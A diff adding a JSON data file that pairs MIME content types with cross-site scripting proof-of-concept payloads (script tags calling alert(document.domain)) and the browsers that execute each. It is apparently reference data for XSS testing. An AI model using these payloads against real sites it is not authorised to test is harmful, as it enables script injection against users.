@@ -1,0 +1,105 @@
+[
+    {
+        "description": "text/html",
+        "code": "<script>alert(document.domain)<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "application/xhtml+xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "application/xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "text/xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "image/svg+xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "text/xsl",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
+    },
+    {
+        "description": "application/vnd.wap.xhtml+xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "firefox",               
+            "safari"
+        ]
+    },
+    {
+        "description": "text/rdf",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "application/rdf+xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "application/mathml+xml",
+        "code": "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "text/vtt",
+        "code": "<script>alert(document.domain)<\/script>",
+        "browsers": [
+            "edge"
+        ]
+    },
+    {
+        "description": "text/cache-manifest",
+        "code": "<script>alert(document.domain)<\/script>",
+        "browsers": [
+            "edge"
+        ]
+    }
+]
